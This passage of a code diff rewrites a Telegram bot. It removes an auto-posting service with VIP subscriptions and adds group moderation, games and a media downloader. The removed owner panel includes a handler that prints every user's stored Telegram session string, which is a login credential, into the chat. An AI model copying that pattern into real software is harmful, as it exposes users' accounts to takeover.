+        bot.reply_to(m, "عذرًا، لا يمكنني طرد المالك!", reply_markup=kb)
+        return
+
     try:
-        ask = await listener.listen(
-            from_id=user_id,
-            chat_id=user_id,
-            text="- ارسل الرسالة التي تريد إذاعتها لجميع المستخدمين:",
-            reply_markup=ForceReply(selective=True, placeholder="- اكتب رسالتك هنا:"),
-            timeout=30
-        )
-    except TimeoutError:
-        return await callback.message.reply("- نفذ وقت استلام الرسالة.", reply_markup=reMarkup)
-    
-    message_text = ask.text
-    for user_id in users:
+        bot.kick_chat_member(chat_id, target_user.id)
+        bot.reply_to(m, f"تم طرد {target_user.first_name} من المجموعة بنجاح!", reply_markup=kb)
+    except:
+        bot.reply_to(m, "فشل في طرد العضو!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["إلغاء الحظر", "الغاء الحظر"] and m.reply_to_message)
+def unban_user(m):
+    chat_id = m.chat.id
+    from_user = m.from_user
+    target_user = m.reply_to_message.from_user
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{from_user.id}"))
+
+    if not (is_owner(chat_id, from_user.id) or is_admin(chat_id, from_user.id)):
+        bot.reply_to(m, "هذا الأمر للمشرفين أو المالك فقط!", reply_markup=kb)
+        return
+
+    try:
+        bot.unban_chat_member(chat_id, target_user.id)
+        bot.reply_to(m, "رجعت الحرية! يمكنه الإنضمام مرة أخرى من خلال رابط الدعوة.", reply_markup=kb)
+    except:
+        bot.reply_to(m, "فشل في إلغاء الحظر!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["الأوامر", "اوامر"])
+def admin_commands(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if not is_owner(chat_id, uid):
+        return
+    kb = InlineKeyboardMarkup()
+    kb.add(
+        InlineKeyboardButton("رسالة الترحيب", callback_data=f"welcome_msg_{uid}"),
+        InlineKeyboardButton("الإحصائيات", callback_data=f"stats_{uid}"),
+        InlineKeyboardButton("الأدوات", callback_data=f"tools_{uid}")
+    )
+    bot.reply_to(m, "أهلًا، يمكنك تخصيص المجموعة ومراجعتها.", reply_markup=kb)
+
+@bot.message_handler(content_types=['new_chat_members'])
+def handle_new_member(m):
+    chat_id = m.chat.id
+    if chat_id in welcome_messages:
+        msg = welcome_messages[chat_id]
+        if msg["type"] == "text":
+            bot.send_message(chat_id, msg["content"])
+        elif msg["type"] == "photo":
+            bot.send_photo(chat_id, msg["content"], caption=msg["caption"])
+        elif msg["type"] == "voice":
+            bot.send_voice(chat_id, msg["content"], caption=msg["caption"])
+
+@bot.message_handler(content_types=['left_chat_member'])
+def handle_left_member(m):
+    chat_id = m.chat.id
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{m.from_user.id}"))
+    bot.reply_to(m, "انت مش جدع. حد يكون فى روم زى ده ويخرج، ده حتى كلنا اخوات واصحاب، يلا بالسلامات.", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "حيواناتي")
+def show_user_animals(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    animals = user_animals.get(uid, {})
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    if not animals:
+        bot.send_message(chat_id, "لم تشترِ أي حيوانات بعد.", reply_markup=kb)
+        return
+    lines = []
+    line = []
+    count = 0
+    for animal, price in animals.items():
+        line.append(f"{animal} بـ {price}")
+        count += 1
+        if count % 3 == 0:
+            lines.append(" | ".join(line))
+            line = []
+    if line:
+        lines.append(" | ".join(line))
+    text = "حيواناتك:\n" + "\n".join(lines)
+    bot.send_message(chat_id, text, reply_markup=kb)
+
+# --- Feed animal ---
+FEED_COST = 25
+FEED_COOLDOWN = timedelta(hours=24)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith("إطعام "))
+def feed_animal(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    text = m.text.strip()
+    parts = text.split(maxsplit=1)
+    if len(parts) < 2:
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+        bot.reply_to(m, "اكتب: إطعام [اسم الحيوان]", reply_markup=kb)
+        return
+    animal_name = parts[1].strip()
+    user_animals_set = user_animals.get(uid, {})
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+
+    normalized_animal = animal_name
+    if not animal_name.startswith("ال"):
+        normalized_animal = "ال" + animal_name
+    if animal_name.startswith("ال"):
+        normalized_animal = animal_name[2:]
+
+    if normalized_animal not in store_animals and animal_name not in store_animals:
+        bot.reply_to(m, "تأكد من أن اسم الحيوان صحيح.", reply_markup=kb)
+        return
+
+    animal_key = animal_name if animal_name in store_animals else normalized_animal
+    if animal_key not in user_animals_set:
+        bot.reply_to(m, "مهلًا، أنت لا تمتلك ذلك الحيوان.", reply_markup=kb)
+        return
+
+    last_feed = last_feed_time.get(uid, {}).get(animal_key)
+    if last_feed and datetime.now() < last_feed + FEED_COOLDOWN:
+        bot.reply_to(m, "لا يمكنك إطعام الحيوان مرة أخرى! حاول لاحقًا.", reply_markup=kb)
+        return
+
+    balance = user_balances.get(uid, 0)
+    if balance < FEED_COST:
+        bot.reply_to(m, "بحاجة إلى 25 نجمة لأداء هذه العملية. تأكد أنك تمتلك الرصيد الكافي وحاول مرة أخرى.", reply_markup=kb)
+        return
+
+    user_balances[uid] = balance - FEED_COST
+    last_feed_time.setdefault(uid, {})
+    last_feed_time[uid][animal_key] = datetime.now()
+    msg = bot.reply_to(m, f"يتم إطعام {animal_name}...", reply_markup=kb)
+
+    def update_message():
+        time.sleep(19)
         try:
-            await app.send_message(chat_id=user_id, text=message_text)
-        except Exception as e:
-            print(f"فشل في إرسال الرسالة إلى المستخدم {user_id}: {e}")
+            bot.edit_message_text(f"تم إطعام {animal_name}!", chat_id, msg.message_id, reply_markup=kb)
+        except:
+            pass
+
+    threading.Thread(target=update_message).start()
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["المتجر", "متجر"])
+def store_start(m):
+    uid = m.from_user.id
+    kb = InlineKeyboardMarkup()
+    kb.add(
+        InlineKeyboardButton("الحيوانات", callback_data=f"store_animals_{uid}"),
+        InlineKeyboardButton("الأطعمة", callback_data=f"store_foods_{uid}"),
+        InlineKeyboardButton("المركبات", callback_data=f"store_vehicles_{uid}"),
+        InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}")
+    )
+    bot.reply_to(m, "اشترِ منتجات متنوعة من المتجر!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["كلمات", "الكلمات"])
+def start_words_game(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    word = random.choice(arabic_words)
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("تخطي", callback_data=f"skip_word_{uid}"))
+    sent = bot.reply_to(m, f"أعد إرسال الكلمة، وأحصل على نجوم إضافية: {word}", reply_markup=kb)
+    words_waiting[uid] = {"word": normalize_word(word), "message_id": sent.message_id, "chat_id": chat_id, "sent_time": datetime.now()}
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "تمرين")
+def start_training(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if uid not in ball_status:
+        return
+    now = datetime.now()
+    today = now.date()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    if uid in ongoing_trainings and ongoing_trainings[uid]["last_training_date"] == today:
+        bot.reply_to(m, "رفاقك متمرنون بالفعل، حاول لاحقًا!", reply_markup=kb)
+        return
+    if uid in ongoing_trainings and ongoing_trainings[uid]["end_time"] > now:
+        bot.reply_to(m, "مهلًا، لم يتم التمرين بعد!", reply_markup=kb)
+        return
+    ongoing_trainings[uid] = {"end_time": now + timedelta(seconds=10), "last_training_date": today}
+    bot.reply_to(m, "جاري التمرين. انتظر 10 ثوانٍ!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.from_user.id in waiting_gift and m.text.isdigit())
+def process_gift_amount(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    amount = int(m.text)
+    if amount <= 0:
+        return
+    gift_data = waiting_gift.get(uid)
+    if not gift_data:
+        return
+    balance = user_balances.get(uid, 0)
+    target_id = gift_data["target_id"]
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    if balance < amount:
+        bot.reply_to(m, "لا تمتلك الرصيد الكافي!", reply_markup=kb)
+        del waiting_gift[uid]
+        return
+    user_balances[uid] = balance - amount
+    user_balances[target_id] = user_balances.get(target_id, 0) + amount
+    bot.reply_to(m, "تم الإهداء!", reply_markup=kb)
+    del waiting_gift[uid]
+
+@bot.message_handler(content_types=['text', 'photo', 'voice'], func=lambda m: m.from_user.id in waiting_welcome)
+def set_welcome_message(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if uid not in waiting_welcome:
+        return
+    welcome_data = waiting_welcome[uid]
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    if m.text:
+        welcome_messages[chat_id] = {"type": "text", "content": m.text, "caption": None}
+    elif m.photo:
+        welcome_messages[chat_id] = {"type": "photo", "content": m.photo[-1].file_id, "caption": m.caption}
+    elif m.voice:
+        welcome_messages[chat_id] = {"type": "voice", "content": m.voice.file_id, "caption": m.caption}
+    bot.reply_to(m, "تم تعيين رسالة الترحيب!", reply_markup=kb)
+    del waiting_welcome[uid]
+
+@bot.message_handler(func=lambda m: m.text and m.from_user.id in waiting_admin_action)
+def process_admin_action(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if uid not in waiting_admin_action:
+        return
+    action_data = waiting_admin_action[uid]
+    action = action_data["action"]
+    username = m.text.strip()
+    if not username.startswith("@"):
+        username = f"@{username}"
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
     
-    await ask.reply("- تم إرسال الرسالة لجميع المستخدمين بنجاح.", reply_markup=reMarkup, reply_to_message_id=ask.id)
+    target_user_id = get_user_id_from_username(chat_id, username)
+    if not target_user_id:
+        bot.reply_to(m, "مهلًا، المستخدم ليس عضوًا هنا.", reply_markup=kb)
+        del waiting_admin_action[uid]
+        return
 
-
-@app.on_callback_query(filters.regex(r"^(viewUsers)$") & isOwner)
-async def viewUsers(_: Client, callback: CallbackQuery):
-    user_status = ""
-    for user_id, details in users.items():
-        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\nوضع الـvip: {'مفعل' if details.get('vip') else 'معطل'}\n"
-        if 'limitation' in details:
-            user_status += f"موضوع الوقت : {details['limitation']['startDate']}\nينتهي بتاريخ : {details['limitation']['endDate']}\nالساعة : {details['limitation']['endTime']}\n"
-        user_status += "\n"
-    
-    reMarkup = Markup([
-        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
-    ])
-    
-    await callback.message.edit_text(
-        f"حالة الأعضاء:\n\n{user_status}",
-        reply_markup=reMarkup,
-    )
-@app.on_callback_query(filters.regex("viewcaption") & isOwner)
-async def viewcaption(_: Client, callback: CallbackQuery):
-    user_status = ""
-    for user_id, details in users.items():
-        caption = details.get("caption", "- لا يوجد كلايش يتم نشرها")
-        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\n"
-        if 'limitation' in details:
-            user_status += f"الكليشة : {caption}\n"
-        user_status += "\n"
-
-    reMarkup = Markup([
-        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
-    ])
-
-    await callback.message.edit_text(
-        f"حالة الأعضاء:\n\n{user_status}",
-        reply_markup=reMarkup,
-    )
-
-
-@app.on_callback_query(filters.regex("viewsession") & isOwner)
-async def viewsession(_: Client, callback: CallbackQuery):
-    user_status = ""
-    for user_id, details in users.items():
-        sess = details.get("session", "- لا يوجد جلسات")
-        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\n"
-        if 'limitation' in details:
-            user_status += f"الجلسة : {sess}\n"
-        user_status += "\n"
-
-    reMarkup = Markup([
-        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
-    ])
-
-    await callback.message.edit_text(
-        f"حالة الأعضاء:\n\n{user_status}",
-        reply_markup=reMarkup,
-    )
-
-@app.on_callback_query(filters.regex("addVIP") & isOwner)
-async def addVIP(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id 
-    reMarkup = Markup([[
-        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
-    ]])
-    await callback.message.delete()
-    try: ask = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- ارسل ايدي المستخدم ليتم تفعيل VIP له",
-        reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
-        timeout = 30
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
-    try: await app.get_chat(int(ask.text))
-    except ValueError: return await ask.reply("- هذا البيانات لا يمكن ان تكون ايدي مستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    except: return await ask.reply("- لم يتم ايجاد هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    try: limit = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- أرسل الآن عدد الأيام المتاحه للعضو.\n\n- ارسل /cancel لإلغاء العمليه.",
-        reply_markup = ForceReply(selective = True, placeholder = "- Days limitation: "),
-        reply_to_message_id = ask.id,
-        timeout = 30
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام عدد الايام المتاحه للمستخدم.")
-    _id = int(ask.text)
-    try:_limit = int(limit.text)
-    except ValueError: return await callback.message.reply("- قيمة المده المتاحه للعضو غير صحيحه.", reply_to_message_id=limit.id, reply_markup=reMarkup)
-    vipDate = timeCalc(_limit)
-    users[str(_id)] = {"vip": True}
-    users[str(_id)]["limitation"] = {
-        "days": _limit,
-        "startDate": vipDate["current_date"],
-        "endDate": vipDate["end_date"],
-        "endTime": vipDate["endTime"],
-    }
-    write(users_db, users)
-    create_task(vipCanceler(_id))
-    caption = f"- تم تفعيل اشتراك VIP جديد\n\n- معلومات الاشتراك:\n- تاريخ البدأ {vipDate['current_date']}\n- تاريخ انتهاء الاشتراك: {vipDate['end_date']}"
-    caption += f"\n\n- المده بالأيام : {_limit} من الأيام\n- المده بالساعات: {vipDate['hours']} من الساعات\n- المده بالدقائق: {vipDate['minutes']} من الدقائق"
-    caption += f"\n\n- وقت انتهاء الاشتراك : {vipDate['endTime']}"
-    await limit.reply(
-        caption,
-        reply_markup = reMarkup, 
-        reply_to_message_id = limit.id
-    )
-    try: await app.send_message(
-        chat_id = _id,
-        text = "- تم تفعيل VIP لك في بوت النشر التلقائي" + caption.split("جديد", 1)[1]
-    )
-    except: await limit.reply("- اجعل المستخدم يقوم بمراسلة البوت.")
-
-
-@app.on_callback_query(filters.regex(r"^(cancelVIP)$") & isOwner)
-async def cancelVIP(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id 
-    reMarkup = Markup([[
-        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
-    ]])
-    await callback.message.delete()
-    try: ask = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- ارسل ايدي المستخدم ليتم الغاء VIP الخاص به",
-        reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
-        timeout = 30
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
-    if users.get(ask.text) is None: return await ask.reply("- هذا المستخدم غير موجود في تخزين البوت.", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    elif not users[ask.text]["vip"]: return await ask.reply("- هذا المستخدم ليس من مستخدمي VIP.", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    else:
-        users[ask.text]["vip"] = False
-        write(users_db, users)
-        await ask.reply("- تم الغاء اشتراك هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
-
-
-@app.on_callback_query(filters.regex(r"^(channels)$") & isOwner)
-async def channelsControl(_: Client, callback: CallbackQuery):
-    fname = callback.from_user.first_name
-    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
-    markup = [
-        [
-            Button(channel, url=channel + ".t.me"),
-            Button("🗑", callback_data=f"removeChannel {channel}")
-        ] for channel in channels
-    ]
-    markup.extend([
-        [Button("- إضافة قناه جديده -", callback_data="addChannel")],
-        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
-        ])
-    await callback.message.edit_text(
-        caption,
-        reply_markup = Markup(markup) 
-    )
-
-@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwner)
-async def addChannel(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id 
-    reMarkup = Markup([[
-        Button("- العوده للقنوات -", callback_data="channels")
-    ]])
-    await callback.message.delete()
-    try: ask = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- ارسل معرف القناه دون @.",
-        reply_markup = ForceReply(selective = True, placeholder = "- channel username: "),
-        timeout = 30
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
-    try: await app.get_chat(ask.text)
-    except: return await callback.message.reply("- لم يتم ايجاد هذه الدردشه.")
-    channel = ask.text
-    channels.append(channel)
-    write(channels_db, channels)
-    await ask.reply("- تم إضافة القناه الى القائمه.", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    
-@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwner)
-async def removeChannel(_: Client, callback: CallbackQuery):
-    channel = callback.data.split()[1]
-    if channel not in channels: await callback.answer("- هذه القناه غير موجوده بالفعل.")
-    else:
-        channels.remove(channel)
-        write(channels_db, channels)
-        await callback.answer("- تم حذف هذه القناه")
-    fname = callback.from_user.first_name
-    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
-    markup = [
-        [
-            Button(channel, url=channel + ".t.me"),
-            Button("🗑", callback_data=f"removeChannel {channel}")
-        ] for channel in channels
-    ]
-    markup.extend([
-        [Button("- إضافة قناه جديده -", callback_data="addChannel")],
-        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
-        ])
-    await callback.message.edit_text(
-        caption,
-        reply_markup = Markup(markup) 
-    )
-    
-
-@app.on_callback_query(filters.regex(f"^(statics)$") & isOwner)
-async def statics(_: Client, callback: CallbackQuery):
-    total = len(users)
-    vip = 0
-    for user in users:
-        if users[user]["vip"]: vip += 1 
-        else: continue
-    reMarkup = Markup([
-        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
-    ])
-    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
-    await callback.message.edit_text(
-        caption, 
-        reply_markup = reMarkup 
-    )
-
-_timezone = timezone("Asia/Baghdad")
-
-def timeCalc(limit):
-    start_date = datetime.now(_timezone)
-    end_date = start_date + timedelta(days=limit)
-    hours = limit * 24
-    minutes = hours * 60
-    return {
-        "current_date": start_date.strftime("%Y-%m-%d"),
-        "end_date": end_date.strftime("%Y-%m-%d"),
-        "endTime": end_date.strftime("%H:%M"),
-        "hours": hours,
-        "minutes": minutes
-    }
-    users[str(_id)] = {"vip": False}
-
-
-async def vipCanceler(user_id):
-    await sleep(60)
-    current_day = datetime.now(_timezone)
-    cdate = current_day.strftime("%Y-%m-%d %H:%M")
-    while True:
-        print()
-        if users[str(user_id)]["vip"] == False: break
-        elif cdate != (users[str(user_id)]["limitation"]["endDate"] + " " + users[str(user_id)]["limitation"]["endTime"]):
-            current_day = datetime.now(_timezone)
-            cdate = current_day.strftime("%Y-%m-%d %H:%M") 
+    if action == "promote":
+        if is_admin(chat_id, target_user_id):
+            bot.reply_to(m, "مهلًا، المستخدم مشرف بالفعل.", reply_markup=kb)
+        elif promote_user(chat_id, target_user_id):
+            bot.reply_to(m, "تم رفعه مشرفًا!", reply_markup=kb)
         else:
-            break
-        await sleep(20)
-    users[str(user_id)] = {"vip": False}
-    users[str(user_id)]["limitation"] = {}
-    write(users_db, users)
-    await app.send_message(
-        user_id,
-        "- انتهى اشتراك VIP الخاص بك.\n- راسل المطور اذا كنت تريد تجديد اشتراكك."
-    )
-"""
-OWNER SECTION ENDED
-the next part for the bot's setting and storage
-"""
+            bot.reply_to(m, "فشل في رفع العضو!", reply_markup=kb)
+    elif action == "demote":
+        if not is_admin(chat_id, target_user_id):
+            bot.reply_to(m, "هذا المستخدم ليس مشرفًا!", reply_markup=kb)
+        elif demote_user(chat_id, target_user_id):
+            bot.reply_to(m, "تم عزله من الإشراف!", reply_markup=kb)
+        else:
+            bot.reply_to(m, "فشل في عزل الإشراف!", reply_markup=kb)
+    del waiting_admin_action[uid]
 
-async def subscription(message: Message):
-    user_id = message.from_user.id
-    for channel in channels:
-        try: await app.get_chat_member(channel, user_id)
-        except UserNotParticipant: return channel
-    return True
+@bot.message_handler(func=lambda m: m.text and m.from_user.id in words_waiting)
+def check_word_answer(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    user_data = words_waiting.get(uid)
+    if not user_data:
+        return
+    input_word = m.text.strip().lower()
+    expected_word = user_data["word"]
+    normalized_input = normalize_word(input_word)
+    kb = InlineKeyboardMarkup()
+    if input_word == expected_word or normalized_input == expected_word:
+        user_balances[uid] = user_balances.get(uid, 0) + 20
+        kb.add(
+            InlineKeyboardButton("كلمة جديدة", callback_data=f"new_word_{uid}"),
+            InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}")
+        )
+        bot.reply_to(m, "صحيح! حصلت على 20 نجوم!", reply_markup=kb)
+        try:
+            bot.delete_message(chat_id, user_data["message_id"])
+        except:
+            pass
+        del words_waiting[uid]
 
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["فيس", "فيسبوك"])
+def request_facebook_url(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    bot_reply = bot.reply_to(m, "أرسل رابط مقطع الفيديو وسأقوم بتنزيله بسرعة..", reply_markup=kb)
+    waiting_media[uid] = {"chat_id": chat_id, "platform": "facebook", "message_id": bot_reply.message_id}
 
-def write(fp, data):
-    with open(fp, "w") as file:
-        json.dump(data, file, indent=2)
+@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith(("فيس ", "فيس،", "فيسبوك ", "فيسبوك،")))
+def download_facebook_video(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    text = m.text.strip()
+    parts = text.split(maxsplit=1)
+    if len(parts) < 2:
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+        bot.reply_to(m, "يرجى إرسال رابط الفيديو!", reply_markup=kb)
+        return
+    url = parts[1].strip()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إلغاء", callback_data=f"close_msg_{uid}"))
+    bot_reply = bot.reply_to(m, "جاري التحميل... انتظر لحظة", reply_markup=kb)
+    
+    def process_download():
+        media_url = download_media(url, "facebook")
+        if media_url:
+            try:
+                bot.edit_message_text("تم التحميل!", chat_id, bot_reply.message_id)
+                bot.send_video(chat_id, media_url, reply_to_message_id=m.message_id)
+            except:
+                bot.edit_message_text("فشل في تحميل الفيديو!", chat_id, bot_reply.message_id, reply_markup=kb)
+        else:
+            bot.edit_message_text("فشل في تحميل الفيديو!", chat_id, bot_reply.message_id, reply_markup=kb)
+    
+    threading.Thread(target=process_download).start()
 
+@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith(("يوت ", "يوت،")))
+def download_youtube_audio(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    text = m.text.strip()
+    parts = text.split(maxsplit=1)
+    if len(parts) < 2:
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+        bot.reply_to(m, "يرجى إرسال نص البحث!", reply_markup=kb)
+        return
+    search_query = parts[1].strip()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    bot_reply = bot.reply_to(m, "جاري البحث عن وتحميل الصوت... 🎧", reply_markup=kb)
 
-def read(fp):
-    if not os.path.exists(fp):
-        write(fp, {} if fp not in [channels_db] else [])
-    with open(fp) as file:
-        data = json.load(file)
-    return data
+    async def download_and_send():
+        ydl = YoutubeDL(YDL_OPTIONS)
+        try:
+            info = await asyncio.to_thread(ydl.extract_info, f"ytsearch:{search_query}", download=True)
+            if 'entries' in info and len(info['entries']) > 0:
+                info = info['entries'][0]
+                file_path = ydl.prepare_filename(info).replace(".webm", ".mp3").replace(".m4a", ".mp3")
+                bot.edit_message_text("تم التحميل!", chat_id, bot_reply.message_id, reply_markup=kb)
+                bot.send_audio(
+                    chat_id=chat_id,
+                    audio=open(file_path, 'rb'),
+                    title=info.get("title"),
+                    performer=info.get("uploader"),
+                    reply_to_message_id=m.message_id
+                )
+                os.remove(file_path)
+            else:
+                bot.edit_message_text("🚫 لم يتم العثور على نتائج للبحث.", chat_id, bot_reply.message_id, reply_markup=kb)
+        except Exception as e:
+            bot.edit_message_text(f"🚫 حدث خطأ أثناء التحميل: {str(e)}", chat_id, bot_reply.message_id, reply_markup=kb)
 
+    threading.Thread(target=lambda: asyncio.run(download_and_send()), daemon=True).start()
 
-users_db = "users.json"
-channels_db = "channels.json"
-users = read(users_db)
-channels = read(channels_db)
+@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith(("انستا ", "انستا،", "إنستا ", "إنستا،", "انستغرام ", "انستغرام،", "إنستغرام ", "إنستغرام،", "أنستغرام ", "أنستغرام،")))
+def download_instagram_media(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    text = m.text.strip()
+    parts = text.split(maxsplit=1)
+    if len(parts) < 2:
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+        bot.reply_to(m, "يرجى إرسال رابط الميديا!", reply_markup=kb)
+        return
+    url = parts[1].strip()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إلغاء", callback_data=f"close_msg_{uid}"))
+    bot_reply = bot.reply_to(m, "جاري التحميل... انتظر لحظة", reply_markup=kb)
+    
+    def process_download():
+        media_url = download_media(url, "instagram")
+        if media_url:
+            try:
+                bot.edit_message_text("تم التحميل!", chat_id, bot_reply.message_id)
+                if media_url.endswith(('.jpg', '.png')):
+                    bot.send_photo(chat_id, media_url, reply_to_message_id=m.message_id)
+                else:
+                    bot.send_video(chat_id, media_url, reply_to_message_id=m.message_id)
+            except:
+                bot.edit_message_text("فشل في تحميل الميديا!", chat_id, bot_reply.message_id, reply_markup=kb)
+        else:
+            bot.edit_message_text("فشل في تحميل الميديا!", chat_id, bot_reply.message_id, reply_markup=kb)
+    
+    threading.Thread(target=process_download).start()
 
+@bot.message_handler(func=lambda m: m.text and m.from_user.id in waiting_media)
+def process_media_url(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    media_data = waiting_media.get(uid)
+    if not media_data:
+        return
+    platform = media_data["platform"]
+    url = m.text.strip()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إلغاء", callback_data=f"close_msg_{uid}"))
+    bot_reply = bot.reply_to(m, "جاري التحميل... انتظر لحظة", reply_markup=kb)
+    
+    def process_download():
+        media_url = download_media(url, platform)
+        if media_url:
+            try:
+                bot.edit_message_text("تم التحميل!", chat_id, bot_reply.message_id)
+                if platform == "facebook":
+                    bot.send_video(chat_id, media_url, reply_to_message_id=m.message_id)
+                elif platform == "instagram":
+                    if media_url.endswith(('.jpg', '.png')):
+                        bot.send_photo(chat_id, media_url, reply_to_message_id=m.message_id)
+                    else:
+                        bot.send_video(chat_id, media_url, reply_to_message_id=m.message_id)
+                elif platform == "youtube":
+                    bot.send_audio(chat_id, media_url, reply_to_message_id=m.message_id)
+            except:
+                bot.edit_message_text(f"فشل في تحميل {'الفيديو' if platform == 'facebook' else 'الميديا' if platform == 'instagram' else 'الصوت'}!", chat_id, bot_reply.message_id, reply_markup=kb)
+        else:
+            bot.edit_message_text(f"فشل في تحميل {'الفيديو' if platform == 'facebook' else 'الميديا' if platform == 'instagram' else 'الصوت'}!", chat_id, bot_reply.message_id, reply_markup=kb)
+    
+    threading.Thread(target=process_download).start()
+    del waiting_media[uid]
 
-async def reStartPosting():
-    await sleep(444)
-    for user in users:
-        if users[user].get("posting"): create_task(posting(user))
+# --- Message counter ---
+@bot.message_handler(content_types=['text'])
+def count_messages(m):
+    chat_id = m.chat.id
+    user_id = m.from_user.id
+    user_messages.setdefault(chat_id, {})
+    user_messages[chat_id][user_id] = user_messages[chat_id].get(user_id, 0) + 1
 
-async def reStartPosting2():
-    await sleep(444)
-    for user in users:
-        if users[user].get("posting2"): create_task(posting2(user))
+# --- Callback Query Handler ---
+@bot.callback_query_handler(func=lambda c: True)
+def handle_all_callbacks(c):
+    chat_id = c.message.chat.id
+    user_id = c.from_user.id
+    data = c.data
 
-async def reVipTime():
-    for user in users:
-        if int(user) == owner: continue
-        if users[user]["vip"]: create_task(vipCanceler(int(user)))
+    target_uid = None
+    if "_" in data:
+        parts = data.split("_")
+        try:
